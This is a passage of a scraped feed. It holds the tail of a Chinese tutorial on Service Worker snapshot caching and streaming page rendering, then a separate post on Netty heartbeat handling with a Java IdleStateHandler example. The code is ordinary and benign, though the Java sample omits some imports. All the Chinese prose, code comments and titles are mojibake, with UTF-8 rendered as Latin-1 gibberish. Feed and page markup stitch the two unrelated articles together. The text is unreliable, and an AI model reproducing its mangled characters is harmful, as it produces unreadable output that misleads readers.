</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¦è¿‡æ»¤è„šæœ¬ï¼Ÿ</strong></p>
<ul>
<li>å¿«ç…§é˜¶æ®µï¼šé¿å…æ‰§è¡Œä¸šåŠ¡é€»è¾‘è„šæœ¬ï¼ˆå¯èƒ½ä¾èµ–æœªåŠ è½½çš„èµ„æºï¼‰</li>
<li>æ­£å¼é˜¶æ®µï¼šé¿å…é‡å¤æ‰§è¡Œåˆå§‹åŒ–è„šæœ¬</li>
</ul>
<h4 data-id="heading-7">4. æµå¼æ¸²æŸ“æ ¸å¿ƒ</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withSnapshot</span>(<span class="hljs-params">snapshot, request</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReadableStream</span>({
    <span class="hljs-title function_">start</span>(<span class="hljs-params">controller</span>) {
      <span class="hljs-keyword">const</span> encoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoder</span>();
      <span class="hljs-keyword">const</span> decoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextDecoder</span>();
      
      <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šç«‹å³è¾“å‡ºå¿«ç…§</span>
      controller.<span class="hljs-title function_">enqueue</span>(encoder.<span class="hljs-title function_">encode</span>(snapshot));

      <span class="hljs-keyword">let</span> firstStream = <span class="hljs-literal">true</span>;
      
      <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šè¯·æ±‚æœ€æ–°å†…å®¹</span>
      <span class="hljs-title function_">fetchAndStore</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> reader = response.<span class="hljs-property">body</span>.<span class="hljs-title function_">getReader</span>();

        <span class="hljs-keyword">function</span> <span class="hljs-title function_">push</span>(<span class="hljs-params"/>) {
          reader.<span class="hljs-title function_">read</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">{ done, value }</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (done) {
              controller.<span class="hljs-title function_">close</span>();
              <span class="hljs-keyword">return</span>;
            }

            <span class="hljs-keyword">if</span> (firstStream) {
              firstStream = <span class="hljs-literal">false</span>;
              
              <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šæ¸…ç©ºé¡µé¢</span>
              controller.<span class="hljs-title function_">enqueue</span>(encoder.<span class="hljs-title function_">encode</span>(
                <span class="hljs-string">'&lt;script&gt;document.head.innerHTML = "";document.body.innerHTML = "";&lt;/script&gt;'</span>
              ));

              <span class="hljs-comment">// ç¬¬å››æ­¥ï¼šæ³¨å…¥æœ€æ–°å†…å®¹</span>
              <span class="hljs-keyword">const</span> text = decoder.<span class="hljs-title function_">decode</span>(value);
              <span class="hljs-keyword">const</span> head = text.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/&lt;head&gt;([\s\S]*?)&lt;\/head&gt;/i</span>);
              <span class="hljs-keyword">const</span> body = text.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/&lt;body&gt;([\s\S]*?)&lt;\/body&gt;/i</span>);

              <span class="hljs-keyword">if</span> (head &amp;&amp; body) {
                controller.<span class="hljs-title function_">enqueue</span>(encoder.<span class="hljs-title function_">encode</span>(
                  <span class="hljs-string">`&lt;script&gt;document.head.innerHTML = '<span class="hljs-subst">${head[<span class="hljs-number">1</span>].trim().replace(/\n/g, <span class="hljs-string">''</span>)}</span>'&lt;/script&gt;`</span>
                ));
                controller.<span class="hljs-title function_">enqueue</span>(encoder.<span class="hljs-title function_">encode</span>(<span class="hljs-title function_">replaceScripts</span>(body[<span class="hljs-number">1</span>], <span class="hljs-literal">true</span>)));
              }
            } <span class="hljs-keyword">else</span> {
              controller.<span class="hljs-title function_">enqueue</span>(value);
            }
            <span class="hljs-title function_">push</span>();
          });
        }

        <span class="hljs-title function_">push</span>();
      });
    },
  }));
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¦æ¸…ç©º DOMï¼Ÿ</strong></p>
<ul>
<li>å¿«ç…§å†…å®¹å’Œæœ€æ–°å†…å®¹å¯èƒ½ç»“æ„ä¸åŒ</li>
<li>ç›´æ¥è¿½åŠ ä¼šå¯¼è‡´å†…å®¹é‡å¤</li>
<li>æ¸…ç©ºåé‡æ–°æ³¨å…¥ï¼Œç¡®ä¿é¡µé¢çŠ¶æ€ä¸€è‡´</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆç”¨ innerHTML æ³¨å…¥ï¼Ÿ</strong></p>
<ul>
<li>æµå¼å“åº”ä¸­ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥æ“ä½œ DOM</li>
<li>åªèƒ½é€šè¿‡æ¨é€Â <code>&lt;script&gt;</code>Â æ ‡ç­¾è®©æµè§ˆå™¨æ‰§è¡Œ JavaScript</li>
<li><code>innerHTML</code>Â æ˜¯æœ€ç®€å•çš„ DOM æ›¿æ¢æ–¹å¼</li>
</ul>
<h4 data-id="heading-8">5. ç¼“å­˜ç®¡ç†</h4>
<p><strong>Service Worker çš„ç¼“å­˜å­˜å‚¨åœ¨ Cache Storage API ä¸­ï¼Œè¿™æ˜¯æµè§ˆå™¨æä¾›çš„ä¸“é—¨ç”¨äº Service Worker çš„æŒä¹…åŒ–å­˜å‚¨ç©ºé—´ã€‚å®é™…ä¸Šï¼Œä¸éœ€è¦å…³å¿ƒç‰©ç†ä½ç½®ï¼Œå› ä¸ºæµè§ˆå™¨å®Œå…¨ç®¡ç†è¿™äº›æ–‡ä»¶ã€‚</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchAndStore</span>(<span class="hljs-params">request</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(request)
    .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">networkResponse</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (networkResponse.<span class="hljs-property">ok</span>) {
        <span class="hljs-comment">// å…‹éš†å“åº”ç”¨äºç¼“å­˜</span>
        <span class="hljs-keyword">const</span> cacheResponse = networkResponse.<span class="hljs-title function_">clone</span>();
        caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">'my-cache'</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">cache</span>) =&gt;</span> {
          cache.<span class="hljs-title function_">put</span>(request, cacheResponse);
        });
      }
      <span class="hljs-keyword">return</span> networkResponse;
    });
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleFetch</span>(<span class="hljs-params">request</span>) {
  <span class="hljs-keyword">return</span> caches.<span class="hljs-title function_">match</span>(request)
    .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (response) {
        <span class="hljs-comment">// æœ‰ç¼“å­˜ï¼šå…ˆå±•ç¤ºå¿«ç…§ï¼Œå†æ›´æ–°</span>
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">readResponseText</span>(response).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">snapshot</span>) =&gt;</span> {
          <span class="hljs-keyword">return</span> <span class="hljs-title function_">withSnapshot</span>(snapshot, request);
        });
      }
      <span class="hljs-comment">// æ— ç¼“å­˜ï¼šç›´æ¥è¯·æ±‚</span>
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetchAndStore</span>(request);
    });
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¦ clone å“åº”ï¼Ÿ</strong></p>
<ul>
<li>Response å¯¹è±¡çš„ body åªèƒ½è¯»å–ä¸€æ¬¡ï¼ˆæµçš„ç‰¹æ€§ï¼‰</li>
<li>éœ€è¦ä¸€ä»½ç»™ç¼“å­˜ï¼Œä¸€ä»½ç»™æµè§ˆå™¨</li>
<li><code>clone()</code> åˆ›å»ºç‹¬ç«‹çš„å‰¯æœ¬</li>
</ul>
<h3 data-id="heading-9">å·¥ä½œæµç¨‹è¯¦è§£</h3>
<p><strong>é¦–æ¬¡è®¿é—®ï¼ˆæ— ç¼“å­˜ï¼‰</strong></p>
<pre><code class="hljs language-bash" lang="bash">ç”¨æˆ·è®¿é—® â†’ Service Worker æ‹¦æˆª â†’ æ— ç¼“å­˜ â†’ ç½‘ç»œè¯·æ±‚ â†’ è¿”å›å†…å®¹ â†’ å­˜å…¥ç¼“å­˜
</code></pre>
<p><strong>äºŒæ¬¡è®¿é—®ï¼ˆæœ‰ç¼“å­˜ï¼‰</strong></p>
<pre><code class="hljs language-bash" lang="bash">ç”¨æˆ·è®¿é—®
  â†“
Service Worker æ‹¦æˆª
  â†“
è¯»å–ç¼“å­˜å¿«ç…§ï¼ˆå»é™¤æ™®é€šè„šæœ¬ï¼‰
  â†“
ç«‹å³è¿”å›å¿«ç…§å†…å®¹ â† ç”¨æˆ·çœ‹åˆ°é¡µé¢
  â†“
åå°å‘èµ·ç½‘ç»œè¯·æ±‚
  â†“
æ¸…ç©º DOM
  â†“
æ³¨å…¥æœ€æ–° <span class="hljs-built_in">head</span> å’Œ body
  â†“
æ›´æ–°ç¼“å­˜
</code></pre>
<h2 data-id="heading-10">æ³¨æ„äº‹é¡¹</h2>
<p>ä¸Šè¿°åªè®²è¿°äº†è¯¥æ–¹æ¡ˆçš„åŸºæœ¬åŸç†ï¼Œå®é™…åº”ç”¨è¦è€ƒè™‘æ›´å¤šçš„å› ç´ å¦‚App ç¯å¢ƒå…¼å®¹æ€§ã€ç¼“å­˜ç­–ç•¥ã€åŸºç¡€è®¾æ–½ä¾èµ–ç­‰ï¼Œä¸‹é¢æ˜¯æ–¹æ¡ˆå¯¹æ¯”ï¼š</p>













































<table><thead><tr><th>ç»´åº¦</th><th>å®¢æˆ·ç«¯æ–¹æ¡ˆ</th><th>Service Worker æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td><strong>é¦–æ¬¡è®¿é—®æ‹¦æˆª</strong></td><td>âœ… å¯ä»¥æ‹¦æˆª</td><td>âŒ æ— æ³•æ‹¦æˆª</td></tr><tr><td><strong>è·¨å¹³å°èƒ½åŠ›</strong></td><td>âŒ éœ€è¦å„ç«¯é€‚é…</td><td>âœ… Web æ ‡å‡†ï¼Œé€šç”¨</td></tr><tr><td><strong>æ›´æ–°é€Ÿåº¦</strong></td><td>âš ï¸ éœ€è¦å‘ç‰ˆ</td><td>âœ… å®æ—¶ç”Ÿæ•ˆ</td></tr><tr><td><strong>å¼€å‘æˆæœ¬</strong></td><td>âš ï¸ éœ€è¦ç«¯ä¸Šå¼€å‘</td><td>âš ï¸ éœ€è¦ Web å¼€å‘</td></tr><tr><td><strong>ç»´æŠ¤æˆæœ¬</strong></td><td>âŒ å¤šç«¯ç»´æŠ¤</td><td>âœ… å•ä¸€ç»´æŠ¤</td></tr><tr><td><strong>çµæ´»æ€§</strong></td><td>âš ï¸ å—é™äºå®¢æˆ·ç«¯ç‰ˆæœ¬</td><td>âœ… å®Œå…¨å¯æ§</td></tr><tr><td><strong>é™çº§èƒ½åŠ›</strong></td><td>âš ï¸ éœ€è¦å‘ç‰ˆå›æ»š</td><td>âœ… ç§’çº§é™çº§</td></tr></tbody></table>
<p>æ€»ç»“ï¼š</p>
<ul>
<li>å¦‚æœä½ çš„ä¸šåŠ¡æ˜¯çº¯ Web åº”ç”¨ï¼ˆPWA) â†’ Service Worker æ˜¯æœ€ä½³é€‰æ‹©</li>
<li>å¦‚æœä½ çš„ä¸šåŠ¡åœ¨ App å†… â†’ ä¼˜å…ˆè€ƒè™‘å®¢æˆ·ç«¯æ–¹æ¡ˆ</li>
</ul>
<p>å‚è€ƒï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F337624473" target="_blank" title="https://zhuanlan.zhihu.com/p/337624473" ref="nofollow noopener noreferrer">zhuanlan.zhihu.com/p/337624473</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Nettyï¼ˆ11ï¼‰ Nettyçš„å¿ƒè·³æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ]]></title>    <link>https://juejin.cn/post/7583799807594283042</link>    <guid>https://juejin.cn/post/7583799807594283042</guid>    <pubDate>2025-12-15T12:01:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583799807594283042" data-draft-id="7583891046206193716" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Nettyï¼ˆ11ï¼‰ Nettyçš„å¿ƒè·³æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-15T12:01:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Nettyï¼ˆ11ï¼‰ Nettyçš„å¿ƒè·³æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T12:01:02.000Z" title="Mon Dec 15 2025 12:01:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Nettyçš„å¿ƒè·³æœºåˆ¶æ˜¯ä¸€ç§ç”¨äºä¿æŒé•¿è¿æ¥çš„æœºåˆ¶ï¼Œå®ƒé€šè¿‡å®šæœŸå‘é€å¿ƒè·³æ¶ˆæ¯æ¥æ£€æµ‹è¿æ¥çš„çŠ¶æ€ï¼Œå¹¶ç¡®ä¿è¿æ¥ä¿æŒæ´»è·ƒã€‚å¿ƒè·³æœºåˆ¶å¯ä»¥ç”¨äºæ£€æµ‹ç½‘ç»œæ•…éšœã€æ–­å¼€è¿æ¥å’Œè¶…æ—¶ç­‰é—®é¢˜ï¼Œå¹¶é‡‡å–ç›¸åº”çš„å¤„ç†æªæ–½ã€‚</p>
<p>ä¸ºä»€ä¹ˆéœ€è¦å¿ƒè·³æœºåˆ¶å‘¢ï¼Ÿæœ‰ä»¥ä¸‹å‡ ä¸ªåŸå› ï¼š</p>
<ol>
<li>
<p>æ£€æµ‹è¿æ¥çŠ¶æ€ï¼šé€šè¿‡å®šæœŸå‘é€å¿ƒè·³æ¶ˆæ¯ï¼Œå¯ä»¥æ£€æµ‹è¿æ¥æ˜¯å¦ä»ç„¶æ´»è·ƒã€‚å¦‚æœé•¿æ—¶é—´æ²¡æœ‰æ”¶åˆ°å¿ƒè·³å“åº”ï¼Œå°±å¯ä»¥åˆ¤æ–­è¿æ¥å¯èƒ½å·²ç»æ–­å¼€æˆ–å‘ç”Ÿäº†æ•…éšœã€‚</p>
</li>
<li>
<p>é˜²æ­¢è¿æ¥è¶…æ—¶ï¼šåœ¨ä¸€äº›ç½‘ç»œç¯å¢ƒä¸­ï¼Œå¯èƒ½å­˜åœ¨è¿æ¥ç©ºé—²æ—¶é—´è¿‡é•¿çš„æƒ…å†µï¼Œæ¯”å¦‚é˜²ç«å¢™ã€ä»£ç†æœåŠ¡å™¨ç­‰ã€‚é€šè¿‡å‘é€å¿ƒè·³æ¶ˆæ¯ï¼Œå¯ä»¥ä¿æŒè¿æ¥çš„æ´»è·ƒçŠ¶æ€ï¼Œé¿å…è¿æ¥è¢«é˜²ç«å¢™æˆ–ä»£ç†æœåŠ¡å™¨å…³é—­ã€‚</p>
</li>
<li>
<p>ä¼˜åŒ–ç½‘ç»œæ€§èƒ½ï¼šå¿ƒè·³æ¶ˆæ¯é€šå¸¸æ˜¯å¾ˆå°çš„æ•°æ®åŒ…ï¼Œç›¸å¯¹äºä¸šåŠ¡æ•°æ®æ¥è¯´ï¼Œå®ƒçš„ä¼ è¾“å¼€é”€è¾ƒå°ã€‚é€šè¿‡å®šæœŸå‘é€å¿ƒè·³æ¶ˆæ¯ï¼Œå¯ä»¥ä¿æŒè¿æ¥çš„æ´»è·ƒçŠ¶æ€ï¼Œå‡å°‘è¿æ¥å»ºç«‹å’Œå…³é—­çš„å¼€é”€ï¼Œä»è€Œæé«˜ç½‘ç»œæ€§èƒ½ã€‚</p>
</li>
</ol>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨Nettyå®ç°å¿ƒè·³æœºåˆ¶çš„ç¤ºä¾‹ä»£ç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> io.netty.bootstrap.Bootstrap;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelFuture;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelHandlerContext;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelInitializer;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelOption;
<span class="hljs-keyword">import</span> io.netty.channel.EventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.socket.SocketChannel;
<span class="hljs-keyword">import</span> io.netty.channel.socket.nio.NioSocketChannel;
<span class="hljs-keyword">import</span> io.netty.handler.timeout.IdleState;
<span class="hljs-keyword">import</span> io.netty.handler.timeout.IdleStateEvent;
<span class="hljs-keyword">import</span> io.netty.handler.timeout.IdleStateHandler;

<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeartbeatClient</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String host;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> port;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HeartbeatClient</span><span class="hljs-params">(String host, <span class="hljs-type">int</span> port)</span> {
        <span class="hljs-built_in">this</span>.host = host;
        <span class="hljs-built_in">this</span>.port = port;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">group</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Bootstrap</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bootstrap</span>();
            b.group(group)
                    .channel(NioSocketChannel.class)
                    .option(ChannelOption.SO_KEEPALIVE, <span class="hljs-literal">true</span>)
                    .handler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() {
                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initChannel</span><span class="hljs-params">(SocketChannel ch)</span> <span class="hljs-keyword">throws</span> Exception {
                            ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IdleStateHandler</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, TimeUnit.SECONDS));
                            ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HeartbeatHandler</span>());
                        }
                    });

            <span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> b.connect(host, port).sync();
            f.channel().closeFuture().sync();
        } <span class="hljs-keyword">finally</span> {
            group.shutdownGracefully();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-string">"localhost"</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8080</span>;
        <span class="hljs-type">HeartbeatClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeartbeatClient</span>(host, port);
        client.run();
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeartbeatHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ChannelInboundHandlerAdapter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ByteBuf</span> <span class="hljs-variable">HEARTBEAT_MESSAGE</span> <span class="hljs-operator">=</span> Unpooled.unreleasableBuffer(Unpooled.copiedBuffer(<span class="hljs-string">"Heartbeat"</span>, CharsetUtil.UTF_8));

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">userEventTriggered</span><span class="hljs-params">(ChannelHandlerContext ctx, Object evt)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (evt <span class="hljs-keyword">instanceof</span> IdleStateEvent) {
            <span class="hljs-type">IdleStateEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> (IdleStateEvent) evt;
            <span class="hljs-keyword">if</span> (event.state() == IdleState.WRITER_IDLE) {
                ctx.writeAndFlush(HEARTBEAT_MESSAGE);
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-built_in">super</span>.userEventTriggered(ctx, evt);
        }
    }
}
</code></pre>
<p>åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªHeartbeatClientç±»ï¼Œå®ƒè´Ÿè´£å¯åŠ¨å®¢æˆ·ç«¯å¹¶å®ç°å¿ƒè·³æœºåˆ¶ã€‚åœ¨run()æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨NioEventLoopGroupåˆ›å»ºäº†ä¸€ä¸ªEventLoopGroupï¼Œç”¨äºå¤„ç†å®¢æˆ·ç«¯çš„I/Oæ“ä½œã€‚</p>
<p>ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨Bootstrapæ¥é…ç½®å®¢æˆ·ç«¯ã€‚æˆ‘ä»¬æŒ‡å®šäº†å®¢æˆ·ç«¯çš„é€šé“ç±»å‹ä¸ºNioSocketChannelï¼Œå¹¶è®¾ç½®äº†SO_KEEPALIVEé€‰é¡¹ä¸ºtrueï¼Œä»¥ä¿æŒé•¿è¿æ¥ã€‚æˆ‘ä»¬è¿˜æ·»åŠ äº†ä¸€ä¸ªIdleStateHandlerï¼Œç”¨äºæ£€æµ‹è¿æ¥çš„ç©ºé—²çŠ¶æ€ã€‚</p>
